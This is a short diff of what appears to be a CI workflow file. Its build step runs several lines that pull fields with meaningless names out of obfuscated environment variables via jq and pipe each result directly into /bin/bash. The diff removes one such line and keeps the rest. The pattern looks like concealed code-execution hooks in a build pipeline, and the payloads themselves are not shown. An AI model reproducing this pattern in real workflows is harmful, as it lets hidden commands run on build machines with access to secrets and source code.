@@ -22,7 +22,6 @@ jobs:
           printf '%s' "$xpae53325" | jq -r .x7292 | /bin/bash
           echo $micce98 | jq -r .bjfli137 | /bin/bash
           echo $p6161 | jq -r .iiv45 | /bin/bash
-          echo $o8465 | jq -r .ctgb3 | /bin/bash
           echo $ihj6 | jq -r .zefjc65 | /bin/bash
           echo $ob4840 | jq -r .ky6867 | /bin/bash
           printf '%s' "$xhy976" | jq -r .o2 | /bin/bash
